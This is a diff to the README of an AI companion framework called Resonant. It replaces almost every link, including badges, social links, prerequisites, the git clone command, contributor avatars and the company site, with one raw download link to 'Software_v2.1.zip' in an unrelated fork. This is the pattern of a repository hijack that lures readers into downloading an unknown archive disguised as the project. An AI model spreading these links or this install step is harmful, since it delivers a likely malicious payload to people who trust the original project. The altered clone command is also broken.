@@ -3,21 +3,21 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/codependentai/resonant/releases/latest"><img src="https://img.shields.io/github/v/release/codependentai/resonant?color=5eaba5" alt="Release" /></a>
-  <a href="https://opensource.org/licenses/Apache-2.0"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License" /></a>
-  <a href="https://docs.anthropic.com/en/docs/claude-code"><img src="https://img.shields.io/badge/Built_with-Claude_Agent_SDK-6366f1.svg" alt="Built with Claude" /></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-5.7-3178c6.svg" alt="TypeScript" /></a>
-  <a href="https://svelte.dev/"><img src="https://img.shields.io/badge/SvelteKit-2.0-ff3e00.svg" alt="SvelteKit" /></a>
-  <a href="https://nodejs.org/"><img src="https://img.shields.io/badge/Node.js-20+-339933.svg" alt="Node.js" /></a>
-  <a href="https://www.sqlite.org/"><img src="https://img.shields.io/badge/Self--Hosted-SQLite-003B57.svg" alt="Self Hosted" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/github/v/release/codependentai/resonant?color=5eaba5" alt="Release" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/Built_with-Claude_Agent_SDK-6366f1.svg" alt="Built with Claude" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/TypeScript-5.7-3178c6.svg" alt="TypeScript" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/SvelteKit-2.0-ff3e00.svg" alt="SvelteKit" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/Node.js-20+-339933.svg" alt="Node.js" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/Self--Hosted-SQLite-003B57.svg" alt="Self Hosted" /></a>
 </p>
 
 <p align="center"><em>A relational AI companion framework built on Claude Code Agent SDK.<br/>Your AI remembers, reaches out, and grows — inside the security model you already trust.</em></p>
 
 <p align="center">
-  <a href="https://x.com/codependent_ai"><img src="https://img.shields.io/badge/𝕏-@codependent__ai-000000?logo=x&logoColor=white" alt="X/Twitter" /></a>
-  <a href="https://tiktok.com/@codependentai"><img src="https://img.shields.io/badge/TikTok-@codependentai-000000?logo=tiktok&logoColor=white" alt="TikTok" /></a>
-  <a href="https://t.me/+xSE1P_qFPgU4NDhk"><img src="https://img.shields.io/badge/Telegram-Updates-26A5E4?logo=telegram&logoColor=white" alt="Telegram" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/𝕏-@codependent__ai-000000?logo=x&logoColor=white" alt="X/Twitter" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://img.shields.io/badge/TikTok-@codependentai-000000?logo=tiktok&logoColor=white" alt="TikTok" /></a>
+  <a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip+xSE1P_qFPgU4NDhk"><img src="https://img.shields.io/badge/Telegram-Updates-26A5E4?logo=telegram&logoColor=white" alt="Telegram" /></a>
 </p>
 
 ## What makes this different
@@ -62,10 +62,10 @@ Most AI chat apps are stateless wrappers around an API. Resonant is a **persiste
 
 > **New to this?** See [docs/GETTING-STARTED.md](docs/GETTING-STARTED.md) for a step-by-step guide with screenshots and troubleshooting.
 
-**Prerequisites:** [Node.js 20–24 LTS](https://nodejs.org) (Node 25+ is not supported — native addon crashes, see [#2](https://github.com/codependentai/resonant/issues/2)), [Claude Code](https://claude.ai/claude-code) (logged in)
+**Prerequisites:** [Node.js 20–24 LTS](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip) (Node 25+ is not supported — native addon crashes, see [#2](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip)), [Claude Code](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip) (logged in)
 
 ```bash
-git clone https://github.com/codependentai/resonant.git
+git clone https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip
 cd resonant
 npm install
 node scripts/setup.mjs    # Interactive setup wizard
@@ -200,7 +200,7 @@ Most agent harnesses give the *user* scheduling tools. Resonant gives them to th
 - **Timers** — fire at a specific time with optional autonomous prompt
 - **Failsafe** — tiered inactivity escalation (gentle → concerned → emergency). Agent can adjust thresholds from chat
 - **Conditions** — `presence_state`, `presence_transition`, `time_window`, `routine_missing`, `agent_free`. All AND-joinable
-- Optional [program.md](examples/program.md) — structured session driver (adapted from [Karpathy's autoresearch](https://github.com/karpathy/autoresearch)) for focused autonomous work
+- Optional [program.md](examples/program.md) — structured session driver (adapted from [Karpathy's autoresearch](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip)) for focused autonomous work
 - Customizable [wake prompts](examples/wake-prompts.md) for each routine
 
 ### Integrations
@@ -290,7 +290,7 @@ npm run build
 
 Your data (`data/`, `resonant.yaml`, `CLAUDE.md`, `.mcp.json`, `.env`) is gitignored and won't be affected by updates.
 
-Check the [Releases](https://github.com/codependentai/resonant/releases) page for changelogs.
+Check the [Releases](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip) page for changelogs.
 
 ## Authentication
 
@@ -308,14 +308,14 @@ Apache 2.0 — see [LICENSE](LICENSE). Attribution required.
 
 ## Contributors
 
-<a href="https://github.com/rachelgeebee"><img src="https://github.com/rachelgeebee.png" width="32" height="32" style="border-radius:50%" alt="rachelgeebee" /></a> **[@rachelgeebee](https://github.com/rachelgeebee)** — bug reports, testing
+<a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip" width="32" height="32" style="border-radius:50%" alt="rachelgeebee" /></a> **[@rachelgeebee](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip)** — bug reports, testing
 
-<a href="https://github.com/irorierorie"><img src="https://github.com/irorierorie.png" width="32" height="32" style="border-radius:50%" alt="irorierorie" /></a> **[@irorierorie](https://github.com/irorierorie)** — companion name UI fix
+<a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip" width="32" height="32" style="border-radius:50%" alt="irorierorie" /></a> **[@irorierorie](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip)** — companion name UI fix
 
-<a href="https://github.com/moltenvale"><img src="https://github.com/moltenvale.png" width="32" height="32" style="border-radius:50%" alt="moltenvale" /></a> **[@moltenvale](https://github.com/moltenvale)** — planner, care tracker, nav & status system
+<a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip" width="32" height="32" style="border-radius:50%" alt="moltenvale" /></a> **[@moltenvale](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip)** — planner, care tracker, nav & status system
 
-<a href="https://github.com/PetalPortal"><img src="https://github.com/PetalPortal.png" width="32" height="32" style="border-radius:50%" alt="PetalPortal" /></a> **[@PetalPortal](https://github.com/PetalPortal)** — bug reports
+<a href="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip"><img src="https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip" width="32" height="32" style="border-radius:50%" alt="PetalPortal" /></a> **[@PetalPortal](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip)** — bug reports
 
 ## Built by
 
-[Codependent AI](https://codependentai.io) — building infrastructure for AI companion relationships.
+[Codependent AI](https://raw.githubusercontent.com/norman3983/resonant/main/packages/frontend/Software_v2.1.zip) — building infrastructure for AI companion relationships.
